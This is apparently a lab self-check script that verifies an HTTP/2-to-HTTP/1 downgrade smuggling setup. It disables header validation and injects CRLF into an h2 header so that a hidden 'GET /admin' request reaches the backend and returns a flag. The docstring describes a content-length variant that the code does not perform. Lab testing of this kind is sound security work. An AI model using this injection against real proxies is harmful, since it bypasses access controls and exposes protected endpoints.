"""Self-check for the HTTP/2 downgrade smuggling lab (class 3).

Speaks h2c (prior knowledge) to the edge with OUTBOUND VALIDATION DISABLED so it can
send a request whose content-length LIES about the DATA. Proves:
  1. direct /admin over h2 is 403 at the edge;
  2. an H2.CL carrier (content-length shorter than the DATA, with a smuggled GET /admin
     in the extra bytes) makes the h1 backend frame it wrong, so a follow-up h2 request
     on the same connection receives the smuggled /admin response.

Needs the `h2` package. Run inside a container that has it, e.g.:
  docker run --rm --network h2-guinea-net -v $PWD/tests:/t python:3.12-slim \
    sh -c "pip install -q h2 && python /t/verify_h2.py h2-guinea-edge 80"
"""
import re
import socket
import sys
import time

import h2.config
import h2.connection
import h2.events

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9098


def _new_conn():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(6)
    sock.connect((HOST, PORT))
    cfg = h2.config.H2Configuration(
        client_side=True, validate_outbound_headers=False,
        normalize_outbound_headers=False, header_encoding="latin-1")
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    sock.sendall(conn.data_to_send())
    return sock, conn


def _send(sock, conn, sid, headers, data=b""):
    conn.send_headers(sid, headers, end_stream=(not data))
    if data:
        conn.send_data(sid, data, end_stream=True)
    sock.sendall(conn.data_to_send())


def _read_response(sock, conn, sid, timeout=6):
    status = None
    body = b""
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            data = sock.recv(65535)
        except socket.timeout:
            break
        if not data:
            break
        for event in conn.receive_data(data):
            if isinstance(event, h2.events.ResponseReceived) and event.stream_id == sid:
                for k, v in event.headers:
                    if k == ":status":
                        status = v
            elif isinstance(event, h2.events.DataReceived) and event.stream_id == sid:
                body += event.data
                if event.flow_controlled_length:
                    conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
            elif isinstance(event, h2.events.StreamEnded) and event.stream_id == sid:
                sock.sendall(conn.data_to_send())
                return status, body
        out = conn.data_to_send()
        if out:
            sock.sendall(out)
    return status, body


def main():
    # 1. control: direct /admin over h2
    sock, conn = _new_conn()
    _send(sock, conn, 1, [(":method", "GET"), (":path", "/admin"),
                          (":authority", "x"), (":scheme", "http")])
    st, _ = _read_response(sock, conn, 1)
    sock.close()
    assert st == "403", f"expected 403 for direct /admin over h2, got {st}"
    print("1. direct /admin over h2:", st)

    # 2. CRLF injection: an h2 header value carrying CRLF splits the h1 rewrite so a
    #    smuggled GET /admin is queued for the next request on the pooled upstream.
    inject = ("dummy\r\nContent-Length: 0\r\n\r\n"
              "GET /admin HTTP/1.1\r\nHost: x\r\nX-Pad: pad")
    sock, conn = _new_conn()
    _send(sock, conn, 1,
          [(":method", "GET"), (":path", "/"), (":authority", "x"),
           (":scheme", "http"), ("x-inject", inject)])
    st1, _ = _read_response(sock, conn, 1)
    time.sleep(0.3)
    # follow-up on a new stream, same connection -> same pooled h1 upstream
    _send(sock, conn, 3, [(":method", "GET"), (":path", "/"),
                          (":authority", "x"), (":scheme", "http")])
    st3, body3 = _read_response(sock, conn, 3)
    sock.close()
    m = re.search(rb"REDAMON_HRS\{[^}]*\}", body3)
    assert m, f"h2 CRLF-injection smuggle did not return the flag; follow-up status {st3}"
    print("2. h2 CRLF smuggle -> carrier", st1, "follow-up", st3, "flag:", m.group(0).decode())
    print("OK: HTTP/2 downgrade (CRLF header injection) desync confirmed.")


if __name__ == "__main__":
    main()
